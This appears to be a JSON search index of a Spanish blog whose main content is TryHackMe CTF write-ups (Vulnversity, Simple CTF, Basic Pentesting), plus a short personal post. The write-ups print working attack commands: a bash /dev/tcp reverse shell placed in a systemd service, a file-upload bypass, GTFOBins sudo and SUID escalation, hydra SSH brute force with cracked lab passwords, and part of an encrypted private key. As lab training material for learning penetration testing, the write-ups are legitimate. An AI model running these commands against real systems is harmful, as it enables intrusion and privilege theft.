
{
    
    
    
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
    "pages": [{"date":"2023-08-26","image":"/images/post_pics/vulnversity/vulnversity.png","link":"https://k3ssdev.github.io/posts/vulnversity/","summary":"Introducción Vulnversity es la primera máquina a vulnerar del learning path “Offensive Pentesting” de TryHackMe. Es una sala sencilla que sirve para practicar los fundamentos vistos durante el path de “Jr Penetration Tester”. El objetivo principal era identificar vulnerabilidades y puntos de entrada en el sistema a partir de una aplicación web, así como realizar una escalada de privilegios para obtener acceso root.","tags":["Burp Suite","Directory Enumeration","Easy","File Upload Vulnerability","Gobuster","Privilege escalation","Reverse Shell","SUID"],"text":"introducción vulnversity es la primera máquina a vulnerar del learning path “offensive pentesting” de tryhackme. es una sala sencilla que sirve para practicar los fundamentos vistos durante el path de “jr penetration tester”. el objetivo principal era identificar vulnerabilidades y puntos de entrada en el sistema a partir de una aplicación web, así como realizar una escalada de privilegios para obtener acceso root.\nrecopilación de información (reconocimiento) comenzamos con un escaneo de puertos utilizando nmap para enumerar los servicios en la máquina:\nnmap -ss -p- -t4 -on nmap_scan 10.10.71.251 los resultados revelaron varios puertos abiertos, incluidos el 21 (ftp), 22 (ssh), 139 (netbios-ssn), 445 (microsoft-ds), 3128 (squid http proxy) y 3333 (http).\nenumeración web escaneo de directorios con gobuster luego, decidí realizar un escaneo de directorios en el servidor web que se ejecutaba en el puerto 3333. utilicé gobuster con la lista de directorios predeterminada:\ngobuster dir -u http://10.10.71.251:3333 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt el escaneo reveló un directorio llamado /internal.\nexplotación de la vulnerabilidad mi siguiente paso fue intentar subir un archivo php como shell inversa, pero me encontré con restricciones en la extensión del archivo. luego, creé una lista de extensiones php y utilicé burp suite para realizar un ataque \u0026ldquo;sniper\u0026rdquo;.\ndespués de varios intentos, descubrí que la extensión .phtml permitía eludir la comprobación de extensiones de archivos. subí un archivo llamado shell.phtml que contenía una shell inversa.\nobtención de acceso para obtener acceso, abrí una shell inversa utilizando netcat:\nnc -lvnp 1234 luego, para estabilizar la shell y mejorar su funcionalidad, ejecuté el comando:\npython3 -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; además, configuré la variable de entorno term para xterm con:\nexport term=xterm escalada de privilegios enumeración de usuarios mientras exploraba el sistema, noté que había un usuario llamado \u0026ldquo;bill\u0026rdquo; en el directorio /home.\nbúsqueda de binarios suid luego, utilicé el comando find para buscar binarios con el bit suid y sgid habilitados:\nfind / -type f -perm -u=s -o -type f -perm -g=s 2\u0026gt;/dev/null me llamó la atención el binario /bin/systemctl, que tenía el bit suid habilitado.\nescalada de privilegios con systemctl investigué /bin/systemctl en gtfobins y encontré una forma de escalada de privilegios. modifiqué un archivo de servicio temporal para ejecutar un shell inverso. luego, establecí un listener en mi máquina local y reinicié el servicio temporal. finalmente, obtuve una shell de root en el sistema objetivo.\nobtención de una shell de root para obtener una shell de root, modifiqué el archivo de servicio temporal (*.service) vinculado a /bin/systemctl para ejecutar un shell inverso como root. aquí está la configuración del archivo de servicio:\n[service] type=oneshot execstart=/bin/bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.14.50.184/4444 0\u0026gt;\u0026amp;1\u0026#34; [install] wantedby=multi-user.target luego, reinicié el servicio temporal:\n/bin/systemctl systemctl link $tf y por ultimo ejecute el siguiente comando para obtener una shell de root:\n/bin/systemctl enable $tf --now en mi máquina local, configuré un listener en el puerto 4444:\nnc -lvnp 4444 una vez reiniciado el servicio temporal en la máquina objetivo, obtuve una shell de root en mi máquina local.\nconclusión vulnversity resultó ser una máquina idónea para principiantes, ya que permite practicar y aplicar conceptos fundamentales que serán muy útiles en posteriores máquinas del learning path “offensive pentesting”:\nenumeración de servicios y puertos mediante herramientas como nmap. escaneo de directorios en un servidor web utilizando gobuster. explotación de vulnerabilidades, como restricciones en la extensión de archivos, para cargar archivos maliciosos. obtención de acceso a través de una shell inversa y mejora de la funcionalidad de la shell. escalada de privilegios mediante la identificación de binarios suid y sgid. uso de gtfobins para abusar de binarios con permisos elevados. ","title":"Vulnversity"},{"date":"2023-03-22","image":"/images/post_pics/back/mr-robot-hello.gif","link":"https://k3ssdev.github.io/posts/back/","summary":"Mi vuelta después de varios meses\u0026hellip; ¡Hola a todos! Después de varios meses ausente por aquí, por fin he vuelto. He estado bastante ocupado estudiando para los exámenes de primer semestre del CFGS de Desarrollo de Aplicaciones Multiplataforma, así que no he tenido más remedio que pausar algunas cosas.","tags":["personal"],"text":"mi vuelta después de varios meses\u0026hellip; ¡hola a todos! después de varios meses ausente por aquí, por fin he vuelto. he estado bastante ocupado estudiando para los exámenes de primer semestre del cfgs de desarrollo de aplicaciones multiplataforma, así que no he tenido más remedio que pausar algunas cosas. me alegra decir que todo ha salido bien y ahora puedo centrarme de nuevo en el blog y en la ciberseguridad.\nademás de esto, también he tenido algunos cambios en mi trabajo que me han mantenido bastante ocupado. he estado aprendiendo nuevas tecnologías y lenguajes de programación, lo cual ha sido emocionante pero también agotador. pero estoy seguro de que todo esto me va a ayudar a crecer profesionalmente y a mejorar mis habilidades.\npor último, también he tenido algunos temas personales en casa que me han requerido más atención de lo habitual. pero gracias a los caprichos del todopoderoso q, todo está bien ahora y estoy listo para volver a la carga.\nespero poder seguir compartiendo todo lo que he aprendido durante estos meses y enseñar algunos pequeños proyectos en los que he empezado a trabajar. ¡larga vida y prosperidad!\n(◕‿‿◕) hack the planet! ","title":"I'm back"},{"date":"2022-11-08","image":"/images/post_pics/simple-ctf/simple_ctf_intro.png","link":"https://k3ssdev.github.io/posts/simple_ctf/","summary":"Seguimos con los writeups de TryHackMe. Hoy le toca el turno a una sala fácil pensada tambien para principiantes llamada Simple CTF. En esta máquina hay que conseguir dos banderas para completarla. Vamos allá.\nEnumeración El primer paso que hay que dar en toda prueba de penetración es el de enumeración.","tags":["CTF","easy","hacking","THM","tryhackme","writeup"],"text":"seguimos con los writeups de tryhackme. hoy le toca el turno a una sala fácil pensada tambien para principiantes llamada simple ctf. en esta máquina hay que conseguir dos banderas para completarla. vamos allá.\nenumeración el primer paso que hay que dar en toda prueba de penetración es el de enumeración. la habitación de tryhackme nos hace unas primeras preguntas relacionadas con este paso, que son:\n¿cuantos servicios están funcionando en el puerto 1000? ¿cual es el servicio del puerto más alto? para resolver estas dos preguntas, empezamos con un escaneo de puertos usando nmap.\n┌──(alberto㉿kali)-[~/descargas] └─$ sudo nmap -n -pn -sc -sv -t4 -open 10.10.91.117 starting nmap 7.93 ( https://nmap.org ) at 2022-10-15 20:54 cest nmap scan report for 10.10.91.117 host is up (0.037s latency). not shown: 997 filtered tcp ports (no-response) some closed ports may be reported as filtered due to --defeat-rst-ratelimit port state service version 21/tcp open ftp vsftpd 3.0.3 | ftp-syst: | stat: | ftp server status: | connected to ::ffff:10.18.112.125 | logged in as ftp | type: ascii | no session bandwidth limit | session timeout in seconds is 300 | control connection is plain text | data connections will be plain text | at session startup, client count was 1 | vsftpd 3.0.3 - secure, fast, stable |_end of status | ftp-anon: anonymous ftp login allowed (ftp code 230) |_can\u0026#39;t get directory listing: timeout 80/tcp open http apache httpd 2.4.18 ((ubuntu)) |_http-title: apache2 ubuntu default page: it works |_http-server-header: apache/2.4.18 (ubuntu) | http-robots.txt: 2 disallowed entries |_/ /openemr-5_0_1_3 2222/tcp open ssh openssh 7.2p2 ubuntu 4ubuntu2.8 (ubuntu linux; protocol 2.0) | ssh-hostkey: | 2048 294269149ecad917988c27723acda923 (rsa) | 256 9bd165075108006198de95ed3ae3811c (ecdsa) |_ 256 12651b61cf4de575fef4e8d46e102af6 (ed25519) service info: oss: unix, linux; cpe: cpe:/o:linux:linux_kernel service detection performed. please report any incorrect results at https://nmap.org/submit/ . nmap done: 1 ip address (1 host up) scanned in 44.36 seconds estas son las opciones que uso en nmap:\n-n #sin resolución de dns, más rápido -sc #es equivalente a --script=default -sv* #detección de versión -t4 #establecer una plantilla de tiempo #si tiene una conexión ethernet o de banda ancha decente, recomendaría usar siempre -t4 tras el escaneo, podemos contestar a las dos preguntas que nos hace la sala.\nanálisis de vulnerabilidades en esta fase vamos a analizar las vulnerabilidades que puede tener la máquina. usando los datos recogidos durante la fase de enumeración, podremos comprobar si hay alguna vulnerabilidad conocida que podamos aprovechar.\nen este caso hay una mala configuración de seguyridad, parece que han dejado la puerta abierta en el servidor fpt para que se conecten usuarios anónimos:\nftp-anon: anonymous ftp login allowed (ftp code 230)* bien, ahora toca revisar la web que tienen en el puerto 80 con el servidor apache. voy a usar la herramienta gobuster para enumerar las posibles páginas y directorios que tenga la web.\n┌──(alberto㉿kali)-[~/descargas] └─$ gobuster dir -u http://10.10.91.117/ -w /usr/share/wordlists/dirb/common.txt =============================================================== gobuster v3.2.0-dev by oj reeves (@thecolonial) \u0026amp; christian mehlmauer (@firefart) =============================================================== [+] url: http://10.10.91.117/ [+] method: get [+] threads: 10 [+] wordlist: /usr/share/wordlists/dirb/common.txt [+] negative status codes: 404 [+] user agent: gobuster/3.2.0-dev [+] timeout: 10s =============================================================== 2022/10/15 21:09:57 starting gobuster in directory enumeration mode =============================================================== /.hta (status: 403) [size: 291] /.htaccess (status: 403) [size: 296] /.htpasswd (status: 403) [size: 296] /index.html (status: 200) [size: 11321] /robots.txt (status: 200) [size: 929] /server-status (status: 403) [size: 300] /simple (status: 301) [size: 313] [--\u0026gt; http://10.10.91.117/simple/] progress: 4609 / 4615 (99.87%)=============================================================== 2022/10/15 21:10:16 finished =============================================================== además, compruebo si tiene el fichero robots.txt, que parece ser que el listado que usado para enumerar las paginas no tenia ese termino guardado.\n# # \u0026#34;$id: robots.txt 3494 2003-03-19 15:37:44z mike $\u0026#34; # # this file tells search engines not to index your cups server. # # copyright 1993-2003 by easy software products. # # these coded instructions, statements, and computer programs are the # property of easy software products and are protected by federal # copyright law. distribution and use rights are outlined in the file # \u0026#34;license.txt\u0026#34; which should have been included with this file. if this # file is missing or damaged please contact easy software products # at: # # attn: cups licensing information # easy software products # 44141 airport view drive, suite 204 # hollywood, maryland 20636-3111 usa # # voice: (301) 373-9600 # email: cups-info@cups.org # www: http://www.cups.org # user-agent: * disallow: / disallow: /openemr-5_0_1_3 # # end of \u0026#34;$id: robots.txt 3494 2003-03-19 15:37:44z mike $\u0026#34;. entro en la dirección encontrada y veo que tienen un cms llamado cms made simple (version 2.2.8).\nhago una busqueda rápida para ver que vulnerabilidades puede tener.\nhttps://www.exploit-db.com/exploits/46635\ncve-2019-9053 es una vulnerabilidad de tipo sql injection. en el script que descargo vienen unas intrucciones:\n[+] example usage (with cracking password): exploit.py -u http://target-uri --crack -w /path-wordlist\u0026#34; aquí acaba la fase de recopilación de información, en principio\u0026hellip;\nexplotación vamos a aprovecharnos de la mala configuración del servidor ftp para acceder y husmear un poco, por si hubiese algo de utilidad.\n┌──(alberto㉿kali)-[~/descargas] └─$ ftp 10.10.91.117 connected to 10.10.91.117. 220 (vsftpd 3.0.3) name (10.10.91.117:alberto): anonymous 230 login successful. remote system type is unix. using binary mode to transfer files. ftp\u0026gt; ls 229 entering extended passive mode (|||47009|) ftp: can\u0026#39;t connect to `10.10.91.117:47009\u0026#39;: expiró el tiempo de conexión 200 eprt command successful. consider using epsv. 150 here comes the directory listing. drwxr-xr-x 2 ftp ftp 4096 aug 17 2019 pub 226 directory send ok. ftp\u0026gt; cd pub 250 directory successfully changed. ftp\u0026gt; ls 200 eprt command successful. consider using epsv. 150 here comes the directory listing. -rw-r--r-- 1 ftp ftp 166 aug 17 2019 formitch.txt 226 directory send ok. ftp\u0026gt; get formitch.txt local: formitch.txt remote: formitch.txt 200 eprt command successful. consider using epsv. 150 opening binary mode data connection for formitch.txt (166 bytes). 100% |***************************************************************************************************************************** ********************************************************************| 166 4.52 mib/s 00:00 eta 226 transfer complete. 166 bytes received in 00:00 (4.43 kib/s) ftp\u0026gt; exit 221 goodbye. ┌──(alberto㉿kali)-[~/descargas] └─$ cat formitch.txt dammit man... you\u0026#39;te the worst dev i\u0026#39;ve seen. you set the same pass for the system user, and the password is so weak... i cracked it in seconds. gosh... what a mess! vale ahora tenemos un usuario vulnerable, mitch, que tiene una contraseña débil. necesitamos conseguir la contraseña, para ello hay que usar el script de cve-2019-9053. lo ejecuto contra la máquina y le paso una wordlist para intentar crackear la contraseña.\n└─$ python3 cve-2019-9053-python3.py -u http://10.10.60.189/simple/ --crack -w /usr/share/wordlists/rockyou.txt [+] salt for password found: 1dac0d92e9fa6bb2 [+] username found: mitch [+] email found: admin@admin.com [*] try: 0c01f4468bd75d7a84c7eb73846e8d96$ [*] now try to crack password traceback (most recent call last): file \u0026#34;/home/alberto/descargas/cve-2019-9053-python3.py\u0026#34;, line 184, in \u0026lt;module\u0026gt; crack_password() file \u0026#34;/home/alberto/descargas/cve-2019-9053-python3.py\u0026#34;, line 53, in crack_password for line in dict.readlines(): file \u0026#34;/home/alberto/.pyenv/versions/3.10.7/lib/python3.10/codecs.py\u0026#34;, line 322, in decode (result, consumed) = self._buffer_decode(data, self.errors, final) unicodedecodeerror: \u0026#39;utf-8\u0026#39; codec can\u0026#39;t decode byte 0xf1 in position 933: invalid continuation byte parece que el script da algun problema al ejecutarlo con python 3.8, que es el que tengo. estos son los datos que ha podido obtener de momento:\n[+] username found: mitch [+] email found: admin@admin.com [*] try: 0c01f4468bd75d7a84c7eb73846e8d96$ para no perder mas tiempo en arreglar el script para que sea compatible, o buscar la manera de ejecutarlo con python2, voy a hacer un ataque de fuerza bruta contra el servicio ssh usando el usuario que hemos encontrado, ya que la contraseña parece ser muy sencilla. para hacerlo, voy a usar la herramienta hydra.\n┌──(alberto㉿kali)-[~/descargas] └─$ hydra -l mitch -p /usr/share/wordlists/rockyou.txt ssh://10.10.60.189:2222 hydra v9.3 (c) 2022 by van hauser/thc \u0026amp; david maciejak - please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-10-16 00:03:20 [warning] many ssh configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4 [warning] restorefile (you have 10 seconds to abort... (use option -i to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore [data] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task [data] attacking ssh://10.10.60.189:2222/ [2222][ssh] host: 10.10.60.189 login: mitch password: secret 1 of 1 target successfully completed, 1 valid password found [warning] writing restore file because 1 final worker threads did not complete until end. [error] 1 target did not resolve or could not be connected [error] 0 target did not complete hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-10-16 00:03:38 ya tenemos la contraseña, era muy insegura. ahora puedo entrar en el equipo por ssh y obtener la primera bandera.\n┌──(alberto㉿kali)-[~/descargas] └─$ ssh mitch@10.10.60.189 -p 2222 the authenticity of host \u0026#39;[10.10.60.189]:2222 ([10.10.60.189]:2222)\u0026#39; can\u0026#39;t be established. ed25519 key fingerprint is sha256:iq4f0xcna5nnpnaufeqopvtbo8dojpchggmeabedq5g. this key is not known by any other names are you sure you want to continue connecting (yes/no/[fingerprint])? yes warning: permanently added \u0026#39;[10.10.60.189]:2222\u0026#39; (ed25519) to the list of known hosts. mitch@10.10.60.189\u0026#39;s password: welcome to ubuntu 16.04.6 lts (gnu/linux 4.15.0-58-generic i686) * documentation: https://help.ubuntu.com * management: https://landscape.canonical.com * support: https://ubuntu.com/advantage 0 packages can be updated. 0 updates are security updates. last login: mon aug 19 18:13:41 2019 from 192.168.0.190 $ whoami mitch $ ls user.txt $ cat us\tcat: us: no such file or directory $ cat user.txt g00d j0b, keep up! $ por último, hay que buscar la manera de escalar privilegios. una de las formas mas rápidas es buscar algún binario que nos permita usarlo para hacer un bypass a las restricciones de seguridad del sistema. en la página de gtfobins busco el binario del vim, que ya lo he usado antes en otras máquinas, y compruebo que esté instalado en el sistema que estoy atacando.\nhttps://gtfobins.github.io/gtfobins/vim/#sudo\nestos son los métodos que hay para vim:\n#sudo #if the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access. sudo vim -c \u0026#39;:!/bin/sh\u0026#39; #this requires that vim is compiled with python support. prepend :py3 for python 3. sudo vim -c \u0026#39;:py import os; os.execl(\u0026#34;/bin/sh\u0026#34;, \u0026#34;sh\u0026#34;, \u0026#34;-c\u0026#34;, \u0026#34;reset; exec sh\u0026#34;)\u0026#39; #this requires that vim is compiled with lua support. sudo vim -c \u0026#39;:lua os.execute(\u0026#34;reset; exec sh\u0026#34;)\u0026#39; y por suerte, la máquina objetivo lo tiene:\n$ type vim vim is a tracked alias for /usr/bin/vim ejecuto el primer método y obtengo acceso al usuario root.\n$sudo vim -c \u0026#39;:!/bin/sh\u0026#39; # whoami root # cd root\t# ls root.txt # cat root.txt w3ll d0n3. you made it! # con este último paso hemos completado la sala. fácil, sencilla y en cómodos pasos.\n(◕‿‿◕) hack the planet! ","title":"Simple CTF - TryHackMe"},{"date":"2022-10-12","image":"/images/post_pics/basic-pentesting/moMbBki.png","link":"https://k3ssdev.github.io/posts/basic-pentesting/","summary":"Basic Pentesting - TryHackMe \u0026gt; Hoy traigo unos apuntes que me he hecho para una máquina fácil de TryHackMe. En ella se repasan los coneptos más básicos de reconocimiento, ataques de fuerza bruta y enumeración de servicios. A continuación dejo el enlace de THM:","tags":["CTF","easy","hacking","THM","tryhackme","writeup"],"text":"basic pentesting - tryhackme \u0026gt; hoy traigo unos apuntes que me he hecho para una máquina fácil de tryhackme. en ella se repasan los coneptos más básicos de reconocimiento, ataques de fuerza bruta y enumeración de servicios. a continuación dejo el enlace de thm:\nbasic pentesting\nsegún dice la introducción de la sala, estos son los conceptos que se van a aprender con ésta máquina:\nbrute forcing hash cracking service enumeration linux enumeration se puede usar al \u0026ldquo;attackbox\u0026rdquo; de tryhackme o, como es mi caso, conectarse por vpn y atacar con mi propia máquina.\n¡así que vamos a ello!\nreconocimiento el primer paso es iniciar la máquina vulnerable y esperar a que nos de la dirección ip. una vez la tenemos, un simple ping nos ayudará a estar seguros de que estamos en la misma red y vemos a la máquina objetivo. en mi caso, me ha dado la ip 10.10.59.211 y con el ping compruebo que veo al objetivo.\nejecuto un reconocimiento de puertos usando nmap. en esta máquina no importa hacer algo de ruido, asi que uso las opciones -sc (\u0026ndash;script=default) y \u0026ndash;open (mostrar solo puertos abiertos):\n┌──(alberto㉿kali)-[~/descargas] └─$ nmap -sc --open 10.10.59.211 starting nmap 7.93 ( https://nmap.org ) at 2022-10-12 15:48 cest nmap scan report for 10.10.59.211 host is up (0.038s latency). not shown: 994 closed tcp ports (conn-refused) port state service 22/tcp open ssh | ssh-hostkey: | 2048 db45cbbe4a8b71f8e93142aefff845e4 (rsa) | 256 09b9b91ce0bf0e1c6f7ffe8e5f201bce (ecdsa) |_ 256 a5682b225f984a62213da2e2c5a9f7c2 (ed25519) 80/tcp open http |_http-title: site doesn\u0026#39;t have a title (text/html). 139/tcp open netbios-ssn 445/tcp open microsoft-ds 8009/tcp open ajp13 | ajp-methods: |_ supported methods: get head post options 8080/tcp open http-proxy |_http-favicon: apache tomcat |_http-title: apache tomcat/9.0.7 host script results: | smb-os-discovery: | os: windows 6.1 (samba 4.3.11-ubuntu) | computer name: basic2 | netbios computer name: basic2\\x00 | domain name: \\x00 | fqdn: basic2 |_ system time: 2022-10-12t09:48:31-04:00 |_clock-skew: mean: 1h19m59s, deviation: 2h18m34s, median: -1s | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 311: |_ message signing enabled but not required |_nbstat: netbios name: basic2, netbios user: \u0026lt;unknown\u0026gt;, netbios mac: 000000000000 (xerox) | smb2-time: | date: 2022-10-12t13:48:31 |_ start_date: n/a nmap done: 1 ip address (1 host up) scanned in 31.92 seconds en el escaneo de puertos ya vemos algunas cosas interesantes:\ntiene el puerto 22 abierto para un servicio ssh. en el puerto 80 tiene un servidor apache. tiene un servicio smb en el puerto 445 vamos a empezar por el vector más obvio, el servidor web. asi que pongo la ip en la barra de direcciones del navegador y miro lo que hay.\nla página está en construcción, pero podría haber más páginas colgadas que ahora mismo no podemos ver. es en este momento cuando uso la herramienta gobuster para intentar descubrir si hay algo.\n┌──(alberto㉿kali)-[~] └─$ gobuster dir -u http://10.10.59.211/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt =============================================================== gobuster v3.2.0-dev by oj reeves (@thecolonial) \u0026amp; christian mehlmauer (@firefart) =============================================================== [+] url: http://10.10.59.211/ [+] method: get [+] threads: 10 [+] wordlist: /usr/share/wordlists/dirbuster/directory-list-1.0.txt [+] negative status codes: 404 [+] user agent: gobuster/3.2.0-dev [+] timeout: 10s =============================================================== 2022/10/12 16:13:01 starting gobuster in directory enumeration mode =============================================================== /development (status: 301) [size: 318] [--\u0026gt; http://10.10.59.211/development/] progress: 9638 / 141709 (6.80%)^c [!] keyboard interrupt detected, terminating. =============================================================== 2022/10/12 16:13:41 finished gobuster va probando una lista de palabras detrás de la dirección que he indicado, y dependiendo del mensaje http que reciba, marca la dirección como coincidencia positiva o negativa. en este caso, parece que hay una pagína de devolopment colgada, así que pruebo a acceder a ella.\nen estos ficheros veo que han configurado un servicio smb y que hay dos desarrolladores, uno llamado j y otro llamado k, que se intercambian mensajes. al parecer, k deja un mensaje a j sobre que la contraseña que ha puesto a su usario es muy débil y no cumple con las reglas de seguridad de la empresa. esto es importante, ¡ya sabemos que necesitamos conseguir el usuario de j!\nbien, pues ahora toca hacer una enumeración del servicio smb usando la herramienta enum4linux para conseguir el usuario de j.\n┌──(alberto㉿kali)-[~] └─$ enum4linux 10.10.59.211 starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on wed oct 12 16:22:02 2022 =========================================( target information )========================================= target ........... 10.10.59.211 rid range ........ 500-550,1000-1050 username ......... \u0026#39;\u0026#39; password ......... \u0026#39;\u0026#39; known usernames .. administrator, guest, krbtgt, domain admins, root, bin, none ============================( enumerating workgroup/domain on 10.10.59.211 )============================ [+] got domain/workgroup name: workgroup ================================( nbtstat information for 10.10.59.211 )================================ looking up status of 10.10.59.211 basic2 \u0026lt;00\u0026gt; - b \u0026lt;active\u0026gt; workstation service basic2 \u0026lt;03\u0026gt; - b \u0026lt;active\u0026gt; messenger service basic2 \u0026lt;20\u0026gt; - b \u0026lt;active\u0026gt; file server service ..__msbrowse__. \u0026lt;01\u0026gt; - \u0026lt;group\u0026gt; b \u0026lt;active\u0026gt; master browser workgroup \u0026lt;00\u0026gt; - \u0026lt;group\u0026gt; b \u0026lt;active\u0026gt; domain/workgroup name workgroup \u0026lt;1d\u0026gt; - b \u0026lt;active\u0026gt; master browser workgroup \u0026lt;1e\u0026gt; - \u0026lt;group\u0026gt; b \u0026lt;active\u0026gt; browser service elections ... el informe que nos muestra enum4linux es bastante completo y largo. tras revisarlo, me quedo con estos datos:\nel equipo se llama basic2 están compartiendo la carpeta //10.10.59.211/anonymous sin seguridad hay dos usuarios, kay y jan ataque de fuerza bruta contra ssh ahora ya tengo un usuario (jan) para poder realizar mi ataque de fuerza bruta contra el objetivo e intentar tener acceso remoto mediante ssh. para poder hacerlo, voy a usar la herramienta hydra y una wordlist para que pruebe contraseñas con el usuario jan. depende de lo larga que sea la lista, el ataque durará más o menos. en mi caso le llevó algunos minutos, asi que sed pacientes. paciencia\u0026hellip;.\n┌──(alberto㉿kali)-[~] └─$ hydra -l jan -p descargas/rockyou.txt 10.10.59.211 ssh hydra v9.3 (c) 2022 by van hauser/thc \u0026amp; david maciejak - please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-10-12 16:43:07 [warning] many ssh configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4 [warning] restorefile (you have 10 seconds to abort... (use option -i to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore [data] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task [data] attacking ssh://10.10.59.211:22/ [status] 176.00 tries/min, 176 tries in 00:01h, 14344223 to do in 1358:22h, 16 active [status] 128.00 tries/min, 384 tries in 00:03h, 14344015 to do in 1867:43h, 16 active [22][ssh] host: 10.10.59.211 login: jan password: armando 1 of 1 target successfully completed, 1 valid password found hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-10-12 16:49:50 ya tenemos la clave: armando. ahora me conecto por ssh con el usuario de jan y vemos que hay ahí dentro.\n┌──(alberto㉿kali)-[~] └─$ ssh jan@10.10.59.211 the authenticity of host \u0026#39;10.10.59.211 (10.10.59.211)\u0026#39; can\u0026#39;t be established. ed25519 key fingerprint is sha256:xkjdklkocbzjcch0tpriw1pelpuzduftgza4xmda+o4. this host key is known by the following other names/addresses: ~/.ssh/known_hosts:12: [hashed name] are you sure you want to continue connecting (yes/no/[fingerprint])? yes warning: permanently added \u0026#39;10.10.59.211\u0026#39; (ed25519) to the list of known hosts. jan@10.10.59.211\u0026#39;s password: welcome to ubuntu 16.04.4 lts (gnu/linux 4.4.0-119-generic x86_64) * documentation: https://help.ubuntu.com * management: https://landscape.canonical.com * support: https://ubuntu.com/advantage 0 packages can be updated. 0 updates are security updates. the programs included with the ubuntu system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. ubuntu comes with absolutely no warranty, to the extent permitted by applicable law. the programs included with the ubuntu system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. ubuntu comes with absolutely no warranty, to the extent permitted by applicable law. last login: mon apr 23 15:55:45 2018 from 192.168.56.102 jan@basic2:~$ sabemos que hay otro usuario llamado kay, así que tiene que tener una carpeta personal. me muevo hasta ella y reviso que hay.\njan@basic2:~$ ls -la total 12 drwxr-xr-x 2 root root 4096 apr 23 2018 . drwxr-xr-x 4 root root 4096 apr 19 2018 .. -rw------- 1 root jan 47 apr 23 2018 .lesshst jan@basic2:~$ cd .. jan@basic2:/home$ ls jan kay jan@basic2:/home$ cd kay jan@basic2:/home/kay$ ls -la total 48 drwxr-xr-x 5 kay kay 4096 apr 23 2018 . drwxr-xr-x 4 root root 4096 apr 19 2018 .. -rw------- 1 kay kay 756 apr 23 2018 .bash_history -rw-r--r-- 1 kay kay 220 apr 17 2018 .bash_logout -rw-r--r-- 1 kay kay 3771 apr 17 2018 .bashrc drwx------ 2 kay kay 4096 apr 17 2018 .cache -rw------- 1 root kay 119 apr 23 2018 .lesshst drwxrwxr-x 2 kay kay 4096 apr 23 2018 .nano -rw------- 1 kay kay 57 apr 23 2018 pass.bak -rw-r--r-- 1 kay kay 655 apr 17 2018 .profile drwxr-xr-x 2 kay kay 4096 apr 23 2018 .ssh -rw-r--r-- 1 kay kay 0 apr 17 2018 .sudo_as_admin_successful -rw------- 1 root kay 538 apr 23 2018 .viminfo jan@basic2:/home/kay$ cat pass.bak cat: pass.bak: permission denied jan@basic2:/home/kay$ tenemos un fichero llamado pass.bak que tiene pinta de ser la bandera de la sala para la última pregunta. desgraciadamente no puedo acceeder a su contenido. sin embargo veo hay una carpeta oculta llamada .ssh, seguramente contendra la clave de autenticación ssh encriptada. vamos a echarle un ojo:\njan@basic2:/home/kay$ ls .ssh/ authorized_keys id_rsa id_rsa.pub jan@basic2:/home/kay$ cat .ssh/id_rsa -----begin rsa private key----- proc-type: 4,encrypted dek-info: aes-128-cbc,6aba7de35cdb65070b92c1f760e2fe75 ionb/j0q2pd56ez23oaajxlvhusz1crrr4onguankcrxg3+9vn6xcujpzuduutlz o9dyiejb4wuztuebpsmb487rdfvktovqrvhty1k2aly2lka2cnfjz8llv+fmadsn xrvjw/hrigcxpy8b7nsa1eipyrpzhih3qofiylspmyv79rc65i6frkdsvxxzbdfx akan+3t5fu49aevkbjtznltebw31mxjv0llxaqiax5qfexmaciqouwchatlpvxmn lg4bag7cvxs1ampieflx7un4rub9nzs4zp0lplbcb4ueawx0tt+vkd6kzh+bk0au hwqjcdnb/u+drasu3oxqyklku2dpseu7rlvpaqa6y+ogk/wotbntrkrngkqlqxml liwzye4yrletfc275hzvvyh6fklgtofaly0bmqgirm+ewvoxorzpblv8iyntddde 3jrjqboglps01hawkirxupaer18lcz+oly00vw2onl2xkugtqpv2jwh04ygdxbfj lywlxxnjjpvmhkc6a75pe4zvxfmmt0qck4oko1argmqlfnwapxjyv6hauuovexn7 bupo+elyvs5mo5tbpwdhi0nrfngp1t6bn7tvb77acaygzhdlpiaqzmv/0hwrtnrb rvhy1cuf7xgnmbmzyhznewmppe2i8mfsavfcjec3cdgn5tvquxfh6cjjrvrhdxvy vqvjsot+czf7mbwm5nfstpplonndc6jmrueujeiblzbcw6bx5s+b95efecewmmve b0whqnptdtvtg3sfdjxp0hggxqk4bambnm4chfck7rpvcrjskywyvedjmyvc87z0 ysvopvn9wnfoudon+u4pyp6pmnu4zd2qekniwyexzizmyypugcfda0sarf6/kkwg ohoacck3ihaqkkbo+sflgxbahxb6k0ocmqawioxyjunpkn8bzzlqljs1jrzxibhl vapev7x25nauyu5u4bgtfhb/f8abkbel4xlwr+4hxbotpjx6rvbyepz/kvioq3s1 gpwhsrzon320xa4hopkcg66jdyhls6b328uvii6da6fryiona4tejjtpo5rpcsek qkig65gicbpcwj1u4i9mehzehc0r2lyufzbnfyur0qcvo8+ms8x75seeonz8auql 4di4ixitq5sachp4y/ntmz1a3q0fnjzxaqdfk/htadhmq5digxnnw3tbmd8wgveg vfnsaexxeza39jogm3vbon6caxpz124kj0bewzxcbzwki0cphflyumodelqp/nik 